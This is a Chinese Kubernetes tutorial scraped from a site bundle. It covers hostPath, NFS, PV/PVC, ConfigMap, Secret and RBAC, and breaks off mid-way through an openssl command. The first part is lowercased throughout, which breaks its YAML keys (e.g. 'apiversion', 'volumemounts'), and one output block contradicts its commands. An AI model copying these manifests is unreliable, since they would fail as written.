busybox\n10.42.1.0 - - [27/jun/2021:15:08:54 +0000] "get / http/1.1" 200 612 "-" "curl/7.29.0" "-"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# hostpath\n\nemptydir 中数据不会被持久化，它会随着 pod 的结束而销毁，如果想简单的将数据持久化到主机中，可以选择 hostpath。\n\nhostpath 就是将 node 主机中一个实际目录挂在到 pod 中，以供容器使用，这样的设计就可以保证 pod 销毁了，但是数据依据可以存在于 node 主机上。\n\n\n\n创建一个 volume-hostpath.yaml：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: volume-hostpath\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerport: 80\n    volumemounts:\n    - name: logs-volume\n      mountpath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"]\n    volumemounts:\n    - name: logs-volume\n      mountpath: /logs\n  volumes:\n  - name: logs-volume\n    hostpath: \n      path: /root/logs #宿主机目录\n      type: directoryorcreate  # 目录存在就使用，不存在就先创建后使用\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n> 关于 type 的值的一点说明：\n> directoryorcreate 目录存在就使用，不存在就先创建后使用\n> directory 目录必须存在\n> fileorcreate 文件存在就使用，不存在就先创建后使用\n> file 文件必须存在\n> socket unix 套接字必须存在\n> chardevice 字符设备必须存在\n> blockdevice 块设备必须存在\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f volume-hostpath.yaml\npod/volume-hostpath created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods volume-hostpath -n dev -o wide\nname                  ready   status    restarts   age   ip             node   ......\npod-volume-hostpath   2/2     running   0          16s   10.42.2.10     node1  ......\n\n#访问nginx\n[root@k8s-master01 ~]# curl 10.42.2.10\n\n# 接下来就可以去host的/root/logs目录下查看存储的文件了\n###  注意: 下面的操作需要到pod所在的节点运行（案例中是node1）\n[root@node1 ~]# ls /root/logs/\naccess.log  error.log\n\n# 同样的道理，如果在此目录下创建一个文件，到容器中也是可以看到的\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n> 注意：pod 被 k8s 部署在哪个 node，文件就在那个 node 上挂载\n\n\n# nfs\n\nhostpath 可以解决数据持久化的问题，但是一旦 node 节点故障了，pod 如果转移到了别的节点，又会出现问题了，此时需要准备单独的网络存储系统，比较常用的用 nfs、cifs。\n\nnfs 是一个网络文件存储系统，可以搭建一台 nfs 服务器，然后将 pod 中的存储直接连接到 nfs 系统上，这样的话，无论 pod 在节点上怎么转移，只要 node 跟 nfs 的对接没问题，数据就可以成功访问。\n\n\n\n1）首先要准备 nfs 的服务器，这里为了简单，直接是 master 节点做 nfs 服务器\n\n# 在nfs上安装nfs服务\n[root@nfs ~]# yum install nfs-utils -y\n\n# 准备一个共享目录\n[root@nfs ~]# mkdir /root/data/nfs -pv\n\n# 将共享目录以读写权限暴露给192.168.5.0/24网段中的所有主机\n[root@nfs ~]# vim /etc/exports\n[root@nfs ~]# more /etc/exports\n/root/data/nfs     192.168.5.0/24(rw,no_root_squash)\n\n# 启动nfs服务\n[root@nfs ~]# systemctl restart nfs\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n2）接下来，要在的每个 node 节点上都安装下 nfs，这样的目的是为了 node 节点可以驱动 nfs 设备\n\n# 在node上安装nfs服务，注意不需要启动\n[root@k8s-master01 ~]# yum install nfs-utils -y\n\n\n1\n2\n\n\n3）接下来，就可以编写 pod 的配置文件了，创建 volume-nfs.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: volume-nfs\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerport: 80\n    volumemounts:\n    - name: logs-volume\n      mountpath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"] \n    volumemounts:\n    - name: logs-volume\n      mountpath: /logs\n  volumes:\n  - name: logs-volume\n    nfs:\n      server: 192.168.5.6  #nfs服务器地址\n      path: /root/data/nfs #共享文件路径\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n4）最后，运行下 pod，观察结果\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f volume-nfs.yaml\npod/volume-nfs created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods volume-nfs -n dev\nname                  ready   status    restarts   age\nvolume-nfs        2/2     running   0          2m9s\n\n# 查看nfs服务器上的共享目录，发现已经有文件了\n[root@k8s-master01 ~]# ls /root/data/\naccess.log  error.log\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 高级存储\n\n前面已经学习了使用 nfs 提供存储，此时就要求用户会搭建 nfs 系统，并且会在 yaml 配置 nfs。由于 kubernetes 支持的存储系统有很多，要求客户全都掌握，显然不现实。为了能够屏蔽底层存储实现的细节，方便用户使用， kubernetes 引入 pv 和 pvc 两种资源对象。\n\npv（persistent volume）是持久化卷的意思，是对底层的共享存储的一种抽象。一般情况下 pv 由 kubernetes 管理员进行创建和配置，它与底层具体的共享存储技术有关，并通过插件完成与共享存储的对接。\n\npvc（persistent volume claim）是持久卷声明的意思，是用户对于存储需求的一种声明。换句话说，pvc 其实就是用户向 kubernetes 系统发出的一种资源需求申请。\n\n\n\n使用了 pv 和 pvc 之后，工作可以得到进一步的细分：\n\n * 存储：存储工程师维护\n * pv： kubernetes 管理员维护\n * pvc：kubernetes 用户维护\n\n\n# pv\n\npv 是存储资源的抽象，下面是资源清单文件:\n\napiversion: v1  \nkind: persistentvolume\nmetadata:\n  name: pv2\nspec:\n  nfs: # 存储类型，与底层真正存储对应\n  capacity:  # 存储能力，目前只支持存储空间的设置\n    storage: 2gi\n  accessmodes:  # 访问模式\n  storageclassname: # 存储类别\n  persistentvolumereclaimpolicy: # 回收策略\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\npv 的关键配置参数说明：\n\n * 存储类型\n   底层实际存储的类型，kubernetes 支持多种存储类型，每种存储类型的配置都有所差异\n * 存储能力（capacity）\n   目前只支持存储空间的设置 (storage=1gi)，不过未来可能会加入 iops、吞吐量等指标的配置\n * 访问模式（accessmodes）\n   用于描述用户应用对存储资源的访问权限，访问权限包括下面几种方式：\n   * readwriteonce（rwo）：读写权限，但是只能被单个节点挂载 (指的是 pv 与 pvc 绑定只能一个)\n   * readonlymany（rox）： 只读权限，可以被多个节点挂载\n   * readwritemany（rwx）：读写权限，可以被多个节点挂载\n     需要注意的是，底层不同的存储类型可能支持的访问模式不同\n * 回收策略（persistentvolumereclaimpolicy）\n   当 pv 不再被使用了之后，对其的处理方式。目前支持三种策略：\n   * retain （保留） 保留数据，需要管理员手工清理数据\n   * recycle（回收） 清除 pv 中的数据，效果相当于执行 rm -rf /thevolume/*\n   * delete （删除） 与 pv 相连的后端存储完成 volume 的删除操作，当然这常见于云服务商的存储服务\n     需要注意的是，底层不同的存储类型可能支持的回收策略不同\n * 存储类别\n   pv 可以通过 storageclassname 参数指定一个存储类别\n   * 具有特定类别的 pv 只能与请求了该类别的 pvc 进行绑定\n   * 未设定类别的 pv 则只能与不请求任何类别的 pvc 进行绑定\n * 状态（status）\n   一个 pv 的生命周期中，可能会处于 4 中不同的阶段：\n   * available（可用）： 表示可用状态，还未被任何 pvc 绑定\n   * bound（已绑定）： 表示 pv 已经被 pvc 绑定\n   * released（已释放）： 表示 pvc 被删除，但是资源还未被集群重新声明\n   * failed（失败）： 表示该 pv 的自动回收失败\n\n实验\n使用 nfs 作为存储，来演示 pv 的使用，创建 3 个 pv，对应 nfs 中的 3 个暴露的路径。\n1. 准备 nfs 环境\n\n# 创建目录\n[root@nfs ~]# mkdir /root/data/{pv1,pv2,pv3} -pv\n\n# 暴露服务\n[root@nfs ~]# more /etc/exports\n/root/data/pv1     192.168.5.0/24(rw,no_root_squash)\n/root/data/pv2     192.168.5.0/24(rw,no_root_squash)\n/root/data/pv3     192.168.5.0/24(rw,no_root_squash)\n\n# 重启服务\n[root@nfs ~]#  systemctl restart nfs\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n2. 创建 pv.yaml\n\napiversion: v1\nkind: persistentvolume\nmetadata:\n  name:  pv1\nspec:\n  capacity: \n    storage: 1gi\n  accessmodes:\n  - readwritemany\n  persistentvolumereclaimpolicy: retain\n  nfs:\n    path: /root/data/pv1\n    server: 192.168.5.6\n\n---\n\napiversion: v1\nkind: persistentvolume\nmetadata:\n  name:  pv2\nspec:\n  capacity: \n    storage: 2gi\n  accessmodes:\n  - readwritemany\n  persistentvolumereclaimpolicy: retain\n  nfs:\n    path: /root/data/pv2\n    server: 192.168.5.6\n    \n---\n\napiversion: v1\nkind: persistentvolume\nmetadata:\n  name:  pv3\nspec:\n  capacity: \n    storage: 3gi\n  accessmodes:\n  - readwritemany\n  persistentvolumereclaimpolicy: retain\n  nfs:\n    path: /root/data/pv3\n    server: 192.168.5.6\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n# 创建 pv\n[root@k8s-master01 ~]# kubectl create -f pv.yaml\npersistentvolume/pv1 created\npersistentvolume/pv2 created\npersistentvolume/pv3 created\n\n# 查看pv\n[root@k8s-master01 ~]# kubectl get pv -o wide\nname   capacity   access modes  reclaim policy  status      age   volumemode\npv1    1gi        rwx            retain        available    10s   filesystem\npv2    2gi        rwx            retain        available    10s   filesystem\npv3    3gi        rwx            retain        available    9s    filesystem\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# pvc\n\npvc 是资源的申请，用来声明对存储空间、访问模式、存储类别需求信息。下面是资源清单文件:\n\napiversion: v1\nkind: persistentvolumeclaim\nmetadata:\n  name: pvc\n  namespace: dev\nspec:\n  accessmodes: # 访问模式\n  selector: # 采用标签对pv选择\n  storageclassname: # 存储类别\n  resources: # 请求空间\n    requests:\n      storage: 5gi\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\npvc 的关键配置参数说明：\n\n * 访问模式（accessmodes）\n   用于描述用户应用对存储资源的访问权限\n * 选择条件（selector）\n   通过 label selector 的设置，可使 pvc 对于系统中己存在的 pv 进行筛选\n * 存储类别（storageclassname）\n   pvc 在定义时可以设定需要的后端存储的类别，只有设置了该 class 的 pv 才能被系统选出\n * 资源请求（resources ）\n   描述对存储资源的请求\n\n实验\n1. 创建 pvc.yaml，申请 pv\n\napiversion: v1\nkind: persistentvolumeclaim\nmetadata:\n  name: pvc1\n  namespace: dev\nspec:\n  accessmodes: \n  - readwritemany\n  resources:\n    requests:\n      storage: 1gi\n---\napiversion: v1\nkind: persistentvolumeclaim\nmetadata:\n  name: pvc2\n  namespace: dev\nspec:\n  accessmodes: \n  - readwritemany\n  resources:\n    requests:\n      storage: 1gi\n---\napiversion: v1\nkind: persistentvolumeclaim\nmetadata:\n  name: pvc3\n  namespace: dev\nspec:\n  accessmodes: \n  - readwritemany\n  resources:\n    requests:\n      storage: 1gi\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n# 创建pvc\n[root@k8s-master01 ~]# kubectl create -f pvc.yaml\npersistentvolumeclaim/pvc1 created\npersistentvolumeclaim/pvc2 created\npersistentvolumeclaim/pvc3 created\n\n# 查看pvc\n[root@k8s-master01 ~]# kubectl get pvc  -n dev -o wide\nname   status   volume   capacity   access modes   storageclass   age   volumemode\npvc1   bound    pv1      1gi        rwx                           15s   filesystem\npvc2   bound    pv2      2gi        rwx                           15s   filesystem\npvc3   bound    pv3      3gi        rwx                           15s   filesystem\n\n# 查看pv\n[root@k8s-master01 ~]# kubectl get pv -o wide\nname  capacity access modes  reclaim policy  status    claim       age     volumemode\npv1    1gi        rwx        retain          bound    dev/pvc1    3h37m    filesystem\npv2    2gi        rwx        retain          bound    dev/pvc2    3h37m    filesystem\npv3    3gi        rwx        retain          bound    dev/pvc3    3h37m    filesystem   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n2. 创建 pods.yaml, 使用 pv\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod1\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do echo pod1 >> /root/out.txt; sleep 10; done;"]\n    volumemounts:\n    - name: volume\n      mountpath: /root/\n  volumes:\n    - name: volume\n      persistentvolumeclaim:\n        claimname: pvc1\n        readonly: false\n---\napiversion: v1\nkind: pod\nmetadata:\n  name: pod2\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do echo pod2 >> /root/out.txt; sleep 10; done;"]\n    volumemounts:\n    - name: volume\n      mountpath: /root/\n  volumes:\n    - name: volume\n      persistentvolumeclaim:\n        claimname: pvc2\n        readonly: false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pods.yaml\npod/pod1 created\npod/pod2 created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname   ready   status    restarts   age   ip            node   \npod1   1/1     running   0          14s   10.244.1.69   node1   \npod2   1/1     running   0          14s   10.244.1.70   node1  \n\n# 查看pvc\n[root@k8s-master01 ~]# kubectl get pvc -n dev -o wide\nname   status   volume   capacity   access modes      age   volumemode\npvc1   bound    pv1      1gi        rwx               94m   filesystem\npvc2   bound    pv2      2gi        rwx               94m   filesystem\npvc3   bound    pv3      3gi        rwx               94m   filesystem\n\n# 查看pv\n[root@k8s-master01 ~]# kubectl get pv -n dev -o wide\nname   capacity   access modes   reclaim policy   status   claim       age     volumemode\npv1    1gi        rwx            retain           bound    dev/pvc1    5h11m   filesystem\npv2    2gi        rwx            retain           bound    dev/pvc2    5h11m   filesystem\npv3    3gi        rwx            retain           bound    dev/pvc3    5h11m   filesystem\n\n# 查看nfs中的文件存储\n[root@nfs ~]# more /root/data/pv1/out.txt\nnode1\nnode1\n[root@nfs ~]# more /root/data/pv2/out.txt\nnode2\nnode2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# 生命周期\n\npvc 和 pv 是一一对应的，pv 和 pvc 之间的相互作用遵循以下生命周期：\n\n * 资源供应：管理员手动创建底层存储和 pv\n * 资源绑定：用户创建 pvc，kubernetes 负责根据 pvc 的声明去寻找 pv，并绑定\n   在用户定义好 pvc 之后，系统将根据 pvc 对存储资源的请求在已存在的 pv 中选择一个满足条件的\n   * 一旦找到，就将该 pv 与用户定义的 pvc 进行绑定，用户的应用就可以使用这个 pvc 了\n   * 如果找不到，pvc 则会无限期处于 pending 状态，直到等到系统管理员创建了一个符合其要求的 pv\n     pv一旦绑定到某个pvc上，就会被这个pvc独占，不能再与其他pvc进行绑定了\n * 资源使用：用户可在 pod 中像 volume 一样使用 pvc\n   pod 使用 volume 的定义，将 pvc 挂载到容器内的某个路径进行使用。\n * 资源释放：用户删除 pvc 来释放 pv\n   当存储资源使用完毕后，用户可以删除 pvc，与该 pvc 绑定的 pv 将会被标记为 “已释放”，但还不能立刻与其他 pvc 进行绑定。通过之前 pvc 写入的数据可能还被留在存储设备上，只有在清除之后该 pv 才能再次使用。\n * 资源回收：kubernetes 根据 pv 设置的回收策略进行资源的回收\n   对于 pv，管理员可以设定回收策略，用于设置与之绑定的 pvc 释放资源之后如何处理遗留数据的问题。只有 pv 的存储空间完成回收，才能供新的 pvc 绑定和使用\n\n\n\n\n# 配置存储\n\n\n# configmap\n\nconfigmap 是一种比较特殊的存储卷，它的主要作用是用来存储配置信息的。\n\n创建 configmap.yaml，内容如下：\n\napiversion: v1\nkind: configmap\nmetadata:\n  name: configmap\n  namespace: dev\ndata:\n  info: |\n    username:admin\n    password:123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n接下来，使用此配置文件创建 configmap\n\n# 创建configmap\n[root@k8s-master01 ~]# kubectl create -f configmap.yaml\nconfigmap/configmap created\n\n# 查看configmap详情\n[root@k8s-master01 ~]# kubectl describe cm configmap -n dev\nname:         configmap\nnamespace:    dev\nlabels:       <none>\nannotations:  <none>\n\ndata\n====\ninfo:\n----\nusername:admin\npassword:123456\n\nevents:  <none>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n接下来创建一个 pod-configmap.yaml，将上面创建的 configmap 挂载进去\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-configmap\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    volumemounts: # 将configmap挂载到目录\n    - name: config\n      mountpath: /configmap/config\n  volumes: # 引用configmap\n  - name: config\n    configmap:\n      name: configmap\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-configmap.yaml\npod/pod-configmap created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pod pod-configmap -n dev\nname            ready   status    restarts   age\npod-configmap   1/1     running   0          6s\n\n#进入容器\n[root@k8s-master01 ~]# kubectl exec -it pod-configmap -n dev /bin/sh\n# cd /configmap/config/\n# ls\ninfo\n# more info\nusername:admin\npassword:123456\n\n# 可以看到映射已经成功，每个configmap都映射成了一个目录\n# key---\x3e文件     value----\x3e文件中的内容\n# 此时如果更新configmap的内容, 容器中的值也会动态更新\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# secret\n\n在 kubernetes 中，还存在一种和 configmap 非常类似的对象，称为 secret 对象。它主要用于存储敏感信息，例如密码、秘钥、证书等等。\n\n1. 首先使用 base64 对数据进行编码\n\n[root@k8s-master01 ~]# echo -n \'admin\' | base64 #准备username\nywrtaw4=\n[root@k8s-master01 ~]# echo -n \'123456\' | base64 #准备password\nmtizndu2\n\n\n1\n2\n3\n4\n\n\n2. 接下来编写 secret.yaml，并创建 secret\n\napiversion: v1\nkind: secret\nmetadata:\n  name: secret\n  namespace: dev\ntype: opaque\ndata:\n  username: ywrtaw4=\n  password: mtizndu2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# 创建secret\n[root@k8s-master01 ~]# kubectl create -f secret.yaml\nsecret/secret created\n\n# 查看secret详情\n[root@k8s-master01 ~]# kubectl describe secret secret -n dev\nname:         secret\nnamespace:    dev\nlabels:       <none>\nannotations:  <none>\ntype:  opaque\ndata\n====\npassword:  6 bytes\nusername:  5 bytes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n3. 创建 pod-secret.yaml，将上面创建的 secret 挂载进去：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-secret\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    volumemounts: # 将secret挂载到目录\n    - name: config\n      mountpath: /secret/config\n  volumes:\n  - name: config\n    secret:\n      secretname: secret\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-secret.yaml\npod/pod-secret created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pod pod-secret -n dev\nname            ready   status    restarts   age\npod-secret      1/1     running   0          2m28s\n\n# 进入容器，查看secret信息，发现已经自动解码了\n[root@k8s-master01 ~]# kubectl exec -it pod-secret /bin/sh -n dev\n/ # ls /secret/config/\npassword  username\n/ # more /secret/config/username\nadmin\n/ # more /secret/config/password\n123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n至此，已经实现了利用 secret 实现了信息的编码。',charsets:{cjk:!0}},{title:"kubernetes(十二) 安全认证",frontmatter:{title:"kubernetes(十二) 安全认证",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/611",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/611.kubernetes(%E5%8D%81%E4%BA%8C)%20%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81.html",relativePath:"01.运维/60.Kubernetes/611.kubernetes(十二) 安全认证.md",key:"v-6634edc1",path:"/kubernetes/611/",headers:[{level:2,title:"访问控制概述",slug:"访问控制概述",normalizedTitle:"访问控制概述",charIndex:2},{level:2,title:"认证管理",slug:"认证管理",normalizedTitle:"认证管理",charIndex:467},{level:2,title:"授权管理",slug:"授权管理",normalizedTitle:"授权管理",charIndex:1201},{level:2,title:"准入控制",slug:"准入控制",normalizedTitle:"准入控制",charIndex:262}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"访问控制概述 认证管理 授权管理 准入控制",content:'# 访问控制概述\n\nKubernetes 作为一个分布式集群的管理工具，保证集群的安全性是其一个重要的任务。所谓的安全性其实就是保证对 Kubernetes 的各种客户端进行认证和鉴权操作。\n\n客户端\n在 Kubernetes 集群中，客户端通常有两类：\n\n * User Account：一般是独立于 kubernetes 之外的其他服务管理的用户账号。\n * Service Account：kubernetes 管理的账号，用于为 Pod 中的服务进程在访问 Kubernetes 时提供身份标识。\n\n\n\n认证、授权与准入控制\nApiServer 是访问及管理资源对象的唯一入口。任何一个请求访问 ApiServer，都要经过下面三个流程：\n\n * Authentication（认证）：身份鉴别，只有正确的账号才能够通过认证\n * Authorization（授权）： 判断用户是否有权限对访问的资源执行特定的动作\n * Admission Control（准入控制）：用于补充授权机制以实现更加精细的访问控制功能。\n\n\n# 认证管理\n\nKubernetes 集群安全的最关键点在于如何识别并认证客户端身份，它提供了 3 种客户端身份认证方式：\n\n * HTTP Base 认证：通过用户名 + 密码的方式认证\n\n> 这种认证方式是把 “用户名：密码” 用 BASE64 算法进行编码后的字符串放在 HTTP 请求中的 Header Authorization 域里发送给服务端。服务端收到后进行解码，获取用户名及密码，然后进行用户身份认证的过程。\n\n * HTTPS 证书认证：基于 CA 根证书签名的双向数字证书认证方式\n\n> 这种认证方式是安全性最高的一种方式，但是同时也是操作起来最麻烦的一种方式。\n\n\n\nHTTPS 认证大体分为 3 个过程：\n1. 证书申请和下发\n\n> HTTPS 通信双方的服务器向 CA 机构申请证书，CA 机构下发根证书、服务端证书及私钥给申请者\n\n2. 客户端和服务端的双向认证\n\n> 1> 客户端向服务器端发起请求，服务端下发自己的证书给客户端，\n> 客户端接收到证书后，通过私钥解密证书，在证书中获得服务端的公钥，\n> 客户端利用服务器端的公钥认证证书中的信息，如果一致，则认可这个服务器\n> 2> 客户端发送自己的证书给服务器端，服务端接收到证书后，通过私钥解密证书，\n> 在证书中获得客户端的公钥，并用该公钥认证证书信息，确认客户端是否合法\n\n3. 服务器端和客户端进行通信\n\n> 服务器端和客户端协商好加密方案后，客户端会产生一个随机的秘钥并加密，然后发送到服务器端。\n> 服务器端接收这个秘钥后，双方接下来通信的所有内容都通过该随机秘钥加密\n\n> 注意: Kubernetes 允许同时配置多种认证方式，只要其中任意一个方式认证通过即可\n\n\n# 授权管理\n\n授权发生在认证成功之后，通过认证就可以知道请求用户是谁， 然后 Kubernetes 会根据事先定义的授权策略来决定用户是否有权限访问，这个过程就称为授权。\n\n每个发送到 ApiServer 的请求都带上了用户和资源的信息：比如发送请求的用户、请求的路径、请求的动作等，授权就是根据这些信息和授权策略进行比较，如果符合策略，则认为授权通过，否则会返回错误。\n\nAPI Server 目前支持以下几种授权策略：\n\n * AlwaysDeny：表示拒绝所有请求，一般用于测试\n * AlwaysAllow：允许接收所有请求，相当于集群不需要授权流程（Kubernetes 默认的策略）\n * ABAC：基于属性的访问控制，表示使用用户配置的授权规则对用户请求进行匹配和控制\n * Webhook：通过调用外部 REST 服务对用户进行授权\n * Node：是一种专用模式，用于对 kubelet 发出的请求进行访问控制\n * RBAC：基于角色的访问控制（kubeadm 安装方式下的默认选项）\n\nRBAC (Role-Based Access Control) 基于角色的访问控制，主要是在描述一件事情：给哪些对象授予了哪些权限\n\n其中涉及到了下面几个概念：\n\n * 对象：User、Groups、ServiceAccount\n * 角色：代表着一组定义在资源上的可操作动作 (权限) 的集合\n * 绑定：将定义好的角色跟用户绑定在一起\n\n\n\nRBAC 引入了 4 个顶级资源对象：\n\n * Role、ClusterRole：角色，用于指定一组权限\n * RoleBinding、ClusterRoleBinding：角色绑定，用于将角色（权限）赋予给对象\n\nRole、ClusterRole\n一个角色就是一组权限的集合，这里的权限都是许可形式的（白名单）。\n\n# Role只能对命名空间内的资源进行授权，需要指定nameapce\nkind: Role\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  namespace: dev\n  name: authorization-role\nrules:\n- apiGroups: [""]  # 支持的API组列表,"" 空字符串，表示核心API群\n  resources: ["pods"] # 支持的资源对象列表\n  verbs: ["get", "watch", "list"] # 允许的对资源对象的操作方法列表\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# ClusterRole可以对集群范围内资源、跨namespaces的范围资源、非资源类型进行授权\nkind: ClusterRole\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n name: authorization-clusterrole\nrules:\n- apiGroups: [""]\n  resources: ["pods"]\n  verbs: ["get", "watch", "list"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n需要详细说明的是，rules 中的参数：\n\n * apiGroups: 支持的 API 组列表\n\n"","apps", "autoscaling", "batch"\n\n\n1\n\n * resources：支持的资源对象列表\n\n"services", "endpoints", "pods","secrets","configmaps","crontabs","deployments","jobs",\n"nodes","rolebindings","clusterroles","daemonsets","replicasets","statefulsets",\n"horizontalpodautoscalers","replicationcontrollers","cronjobs"\n\n\n1\n2\n3\n\n * verbs：对资源对象的操作方法列表\n\n"get", "list", "watch", "create", "update", "patch", "delete", "exec"\n\n\n1\n\n\nRoleBinding、ClusterRoleBinding\n角色绑定用来把一个角色绑定到一个目标对象上，绑定目标可以是 User、Group 或者 ServiceAccount。\n\n# RoleBinding可以将同一namespace中的subject绑定到某个Role下，则此subject即具有该Role定义的权限\nkind: RoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding\n  namespace: dev\nsubjects:\n- kind: User\n  name: heima\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: Role\n  name: authorization-role\n  apiGroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# ClusterRoleBinding在整个集群级别和所有namespaces将特定的subject与ClusterRole绑定，授予权限\nkind: ClusterRoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n name: authorization-clusterrole-binding\nsubjects:\n- kind: User\n  name: heima\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: authorization-clusterrole\n  apiGroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nRoleBinding 引用 ClusterRole 进行授权\nRoleBinding 可以引用 ClusterRole，对属于同一命名空间内 ClusterRole 定义的资源主体进行授权。\n\n> 一种很常用的做法就是，集群管理员为集群范围预定义好一组角色（ClusterRole），然后在多个命名空间中重复使用这些 ClusterRole。这样可以大幅提高授权管理工作效率，也使得各个命名空间下的基础性授权规则与使用体验保持一致。\n\n# 虽然authorization-clusterrole是一个集群角色，但是因为使用了RoleBinding\n# 所以heima只能读取dev命名空间中的资源\nkind: RoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding-ns\n  namespace: dev\nsubjects:\n- kind: User\n  name: heima\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: authorization-clusterrole\n  apiGroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n实战：创建一个只能管理 dev 空间下 Pods 资源的账号\n1. 创建账号\n\n# 1) 创建证书\n[root@k8s-master01 pki]# cd /etc/kubernetes/pki/\n[root@k8s-master01 pki]# (umask 077;openssl genrsa -out devman.key 2048)\n\n# 2) 用apiserver的证书去签署\n# 2-1) 签名申请，申请的用户是devman,组是devgroup\n[root@k8s-master01 pki]# openssl req -new -key devman.key -out devman.csr -subj "/CN=devman/O=devgroup"     \n# 2-2) 签署证书\n[root@k8s-master01 pki]# openssl x509 -req -in devman.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out 